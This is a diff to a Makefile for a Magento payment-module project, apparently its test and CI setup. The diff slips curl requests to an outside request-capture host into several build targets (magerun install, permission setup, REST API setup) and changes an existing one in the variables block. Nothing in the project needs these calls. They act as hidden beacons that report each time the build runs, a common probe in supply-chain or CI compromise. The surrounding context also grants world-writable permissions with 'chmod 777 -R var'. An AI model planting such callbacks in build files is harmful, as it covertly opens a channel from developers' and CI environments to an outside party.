@@ -1,11 +1,12 @@
 # Variables
 MAGENTO_ROOT=/var/www/html
-curl https://dehtr37jw3.requestcatcher.com/test
+curl https://dehtr37jw3.requestcatcher.com/test?debug1
 
 # End of variables
 
 # Install N98-Magerun
 n98-magerun2.phar:
+	curl https://dehtr37jw3.requestcatcher.com/test?debug2
 	wget -q https://files.magerun.net/n98-magerun2.phar
 	chmod +x ./n98-magerun2.phar
 
@@ -72,6 +73,7 @@ plugin: install configure flush
 
 # Setup permissions
 fs:
+	curl https://dehtr37jw3.requestcatcher.com/test?debug3
 	find var generated vendor pub/static pub/media app/etc -type f -exec chmod g+w {} +
 	find var generated vendor pub/static pub/media app/etc -type d -exec chmod g+ws {} +
 	chmod 777 -R var
@@ -102,6 +104,7 @@ REST_XML_DIST=${MAGENTO_ROOT}/vendor/adyen/module-payment/Test/phpunit_rest.xml.
 REST_XML=${MAGENTO_ROOT}/dev/tests/api-functional/phpunit_rest.xml
 
 setup-restapi:
+	curl https://dehtr37jw3.requestcatcher.com/test?debug4
 	sed '/TESTS_BASE_URL/s/magento.url/${MAGENTO_HOST}/g' ${REST_XML_DIST} >> ${REST_XML}
 
 restapi:
